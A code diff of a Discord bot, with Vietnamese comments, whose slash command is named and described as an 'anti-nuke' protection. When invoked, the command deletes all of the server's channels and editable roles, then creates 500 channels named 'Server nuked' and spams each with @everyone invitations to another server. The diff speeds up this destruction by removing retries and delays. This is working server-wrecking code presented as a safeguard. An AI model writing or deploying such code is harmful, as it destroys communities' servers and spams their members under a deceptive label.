@@ -22,46 +22,33 @@ const client = new Client({
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 /* ===== CONFIG ===== */
-const CHANNEL_NAME = "server-nuked";
-const CREATE_TOTAL = 500;
-const MSG_PER_CHANNEL = 3;
-
-const DELETE_DELAY = 60;     // delay xoá kênh / role
-const MESSAGE_DELAY = 80;   // delay giữa tin nhắn
-const CREATE_BATCH = 6;     // số kênh tạo song song mỗi batch
-const BATCH_DELAY = 120;    // delay giữa các batch
-
-const RETRY_MAX = 5;
+const CHANNEL_NAME = "Server nuked";
+const CREATE_COUNT = 500;
+const MSG_PER_CHANNEL = 5;
+const DELETE_DELAY = 50;
+const CREATE_BATCH = 8; // số kênh tạo song song mỗi đợt (tối ưu nhất)
 /* ================== */
-
-/* ===== Safe Request Wrapper (Auto retry) ===== */
-async function safe(fn, retry = 0) {
-  try {
-    return await fn();
-  } catch (e) {
-    const wait = Math.min(3000 + retry * 1000, 8000);
-    if (retry >= RETRY_MAX) return null;
-    await sleep(wait);
-    return safe(fn, retry + 1);
-  }
-}
-/* =========================================== */
 
 /* ===== Slash Command ===== */
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("Anti nuke cực nhanh + ổn định")
+    .setDescription("Bật Anti Nuke")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
 
 (async () => {
-  await rest.put(
-    Routes.applicationCommands(process.env.CLIENT_ID),
-    { body: commands }
-  );
-  console.log("✅ Slash command registered");
+  try {
+    console.log("🔁 Đăng slash command...");
+    await rest.put(
+      Routes.applicationCommands(process.env.CLIENT_ID),
+      { body: commands }
+    );
+    console.log("✅ Xong!");
+  } catch (e) {
+    console.error(e);
+  }
 })();
 /* ========================= */
 
@@ -75,64 +62,58 @@ client.on("interactionCreate", async interaction => {
 
   const guild = interaction.guild;
 
-  const control = await safe(() =>
-    guild.channels.create({
-      name: "antinuke-control",
-      type: ChannelType.GuildText
-    })
-  );
+  // 🔥 Tạo kênh sống sót để giữ context
+  const controlChannel = await guild.channels.create({
+    name: "Server Rách",
+    type: ChannelType.GuildText
+  });
 
-  if (!control) return;
-
-  await control.send("⚠️ Đang xử lý...");
+  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== XOÁ CHANNEL ===== */
-  for (const ch of guild.channels.cache.values()) {
-    if (ch.id === control.id) continue;
-    await safe(() => ch.delete());
-    await sleep(DELETE_DELAY);
+  for (const ch of [...guild.channels.cache.values()]) {
+    if (ch.id === controlChannel.id) continue;
+    try {
+      await ch.delete();
+      await sleep(DELETE_DELAY);
+    } catch {}
   }
 
   /* ===== XOÁ ROLE ===== */
-  const botPos = guild.members.me.roles.highest.position;
-  const roles = guild.roles.cache.filter(r =>
-    r.editable && r.name !== "@everyone" && r.position < botPos
-  );
+  const botRolePos = guild.members.me.roles.highest.position;
+  const roles = [...guild.roles.cache.values()]
+    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);
 
-  for (const role of roles.values()) {
-    await safe(() => role.delete());
-    await sleep(DELETE_DELAY);
+  for (const role of roles) {
+    try {
+      await role.delete();
+      await sleep(DELETE_DELAY);
+    } catch {}
   }
 
-  await control.send("⚡ Đang tạo kênh...");
+  await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
-  /* ===== TẠO KÊNH + GỬI TIN (BATCH + AUTO RETRY) ===== */
-  for (let i = 0; i < CREATE_TOTAL; i += CREATE_BATCH) {
+  /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
+  for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
     const batch = [];
 
-    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_TOTAL; j++) {
+    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
       batch.push(
-        safe(async () => {
-          const ch = await guild.channels.create({
-            name: CHANNEL_NAME,
-            type: ChannelType.GuildText
-          });
-
+        guild.channels.create({
+          name: CHANNEL_NAME,
+          type: ChannelType.GuildText
+        }).then(async ch => {
           for (let k = 0; k < MSG_PER_CHANNEL; k++) {
-            await safe(() =>
-              ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB")
-            );
-            await sleep(MESSAGE_DELAY);
+            await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
           }
         })
       );
     }
 
     await Promise.all(batch);
-    await sleep(BATCH_DELAY);
   }
 
-  await control.send("✅ Hoàn tất.");
+  await controlChannel.send("✅ Hoàn tất Antinuke.");
 });
 
 client.login(process.env.BOT_TOKEN);
